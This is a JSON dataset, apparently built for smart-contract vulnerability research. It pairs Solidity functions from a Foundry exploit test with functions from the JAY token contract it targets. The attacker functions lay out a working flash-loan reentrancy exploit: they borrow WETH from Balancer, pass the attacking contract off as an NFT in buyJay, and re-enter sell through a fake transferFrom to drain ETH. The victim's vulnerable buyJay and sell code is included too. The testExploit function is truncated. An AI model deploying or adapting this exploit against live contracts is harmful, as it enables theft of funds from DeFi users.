[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        IERC20[] memory, /* tokens*/\n        uint256[] memory amounts,\n        uint256[] memory, /*feeAmounts*/\n        bytes memory /*userData*/\n    ) external {\n        require(msg.sender == address(BALANCER_VAULT));\n\n        // Transfer WETH to ETH and start the attack\n        WETH_TOKEN.withdraw(amounts[0]);\n\n        JAY_TOKEN.buyJay{value: 22 ether}(\n            new address[](0), new uint256[](0), new address[](0), new uint256[](0), new uint256[](0)\n        );\n\n        address[] memory erc721TokenAddress = new address[](1);\n        erc721TokenAddress[0] = address(this);\n\n        uint256[] memory erc721Ids = new uint256[](1);\n        erc721Ids[0] = 0;\n\n        JAY_TOKEN.buyJay{value: 50.5 ether}(\n            erc721TokenAddress, erc721Ids, new address[](0), new uint256[](0), new uint256[](0)\n        );\n        JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this)));\n        JAY_TOKEN.buyJay{value: 3.5 ether}(\n            new address[](0), new uint256[](0), new address[](0), new uint256[](0), new uint256[](0)\n        );\n        JAY_TOKEN.buyJay{value: 8 ether}(\n            erc721TokenAddress, erc721Ids, new address[](0), new uint256[](0), new uint256[](0)\n        );\n        JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this)));\n\n        // Repay the flashloan by depositing ETH for WETH and transferring it back to Balancer\n        (bool success,) = address(WETH_TOKEN).call{value: BORROWED_ETH}(\"deposit\");\n        require(success, \"Deposit failed\");\n        WETH_TOKEN.transfer(address(BALANCER_VAULT), BORROWED_ETH);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 16_288_199);\n        // Adding labels to improve stack traces' readability\n        vm.label(address(JAY_TOKEN), \"JAY_TOKEN\");\n        vm.label(address(BALANCER_VAULT), \"BALANCER_VAULT\");\n        vm.label(address(WETH_TOKEN), \"WETH_TOKEN\");\n        vm.label(0xce88686553686DA562CE7Cea497CE749DA109f9F, \"BALANCER_ProtocolFeesCollector\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // \"Clean\" contract's balance\n        payable(address(0)).transfer(address(this).balance);\n        emit log_named_decimal_uint(\"[Start] Attacker ETH balance before exploit\", address(this).balance, 18);\n\n        // Setup flashloan parameters\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH_TOKEN);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = BORROWED_ETH;\n        // The following value for \"b\" was used in the original exploit, but it is actually not required here\n        bytes memory b =\n            \"0x000000000000000000000000000000000000000000000001314fb37062980000000000000000000000000000000000000000000000000002bcd40a70853a000000000000000000000000000000000000000000000000000030927f74c9de00000000000000000000000000000000000000000000000000006f05b59d3b200000\";\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address, /*sender*/ address, /*recipient*/ uint256 /*amount*/ ) external {\n        JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this))); // reenter call JAY_TOKEN.sell\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IJay",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IJay",
    "source_type": "victim_contract",
    "function_name": "buyJay",
    "original_code": "    function buyJay(\n        address[] calldata erc721TokenAddress,\n        uint256[] calldata erc721Ids,\n        address[] calldata erc1155TokenAddress,\n        uint256[] calldata erc1155Ids,\n        uint256[] calldata erc1155Amounts\n    ) public payable {\n        require(start, \"Not started!\");\n        uint256 total = erc721TokenAddress.length;\n        if (total != 0) buyJayWithERC721(erc721TokenAddress, erc721Ids);\n\n        if (erc1155TokenAddress.length != 0)\n            total = total.add(\n                buyJayWithERC1155(\n                    erc1155TokenAddress,\n                    erc1155Ids,\n                    erc1155Amounts\n                )\n            );\n\n        if (total >= 100)\n            require(\n                msg.value >= (total).mul(sellNftFeeEth).div(2),\n                \"You need to pay ETH more\"\n            );\n        else\n            require(\n                msg.value >= (total).mul(sellNftFeeEth),\n                \"You need to pay ETH more\"\n            );\n\n        _mint(msg.sender, ETHtoJAY(msg.value).mul(97).div(100));\n\n        (bool success, ) = dev.call{value: msg.value.div(34)}(\"\");\n        require(success, \"ETH Transfer failed.\");\n\n        nftsSold += total;\n\n        emit Price(block.timestamp, JAYtoETH(1 * 10**18));\n    }\n\n    function buyJayWithERC721(\n        address[] calldata _tokenAddress,\n        uint256[] calldata ids\n    ) internal {\n        for (uint256 id = 0; id < ids.length; id++) {\n            IERC721(_tokenAddress[id]).transferFrom(\n                msg.sender,\n                address(this),\n                ids[id]\n            );\n        }\n    }\n\n    function buyJayWithERC1155(\n        address[] calldata _tokenAddress,\n        uint256[] calldata ids,\n        uint256[] calldata amounts\n    ) internal returns (uint256) {\n        uint256 amount = 0;\n        for (uint256 id = 0; id < ids.length; id++) {\n            amount = amount.add(amounts[id]);\n            IERC1155(_tokenAddress[id]).safeTransferFrom(\n                msg.sender,\n                address(this),\n                ids[id],\n                amounts[id],\n                \"\"\n            );\n        }\n        return amount;\n    }\n\n    // Sell Jay\n",
    "description": ""
  },
  {
    "contract/interface": "IJay",
    "source_type": "victim_contract",
    "function_name": "sell",
    "original_code": "    function sell(uint256 value) public {\n        require(value > MIN, \"Dude tf\");\n\n        uint256 eth = JAYtoETH(value);\n        _burn(msg.sender, value);\n\n        (bool success, ) = msg.sender.call{value: eth.mul(90).div(100)}(\"\");\n        require(success, \"ETH Transfer failed.\");\n        (bool success2, ) = dev.call{value: eth.div(33)}(\"\");\n        require(success2, \"ETH Transfer failed.\");\n\n        emit Price(block.timestamp, JAYtoETH(1 * 10**18));\n    }\n\n    // Buy Jay (No NFT)\n",
    "description": ""
  }
]